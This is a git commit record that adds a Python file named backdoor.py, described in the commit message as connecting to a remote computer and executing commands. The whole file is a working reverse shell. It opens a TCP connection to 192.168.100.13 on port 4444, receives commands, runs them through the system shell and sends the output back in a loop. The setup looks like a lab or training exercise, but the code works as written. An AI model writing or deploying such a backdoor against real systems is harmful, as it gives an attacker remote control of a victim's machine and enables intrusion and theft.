a92c5874db830dedb2d78f886f364c746a7970e1
Sergey Nazemtsev <42sdn@mail.ru>
2021-08-11 17:44:53 +0700

    Connection with remote computer + executing commands

---
+++ backdoor.py
@@ -0,0 +1,19 @@
+import socket
+import subprocess
+
+
+def execute_system_command(command):
+    return subprocess.check_output(command, shell=True)
+
+
+connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connection.connect(("192.168.100.13", 4444))
+
+connection.send("\n[+] Connection established\n")
+
+while True:
+    command = connection.recv(1024)
+    command_result = execute_system_command(command)
+    connection.send(command_result)
+
+connection.close()
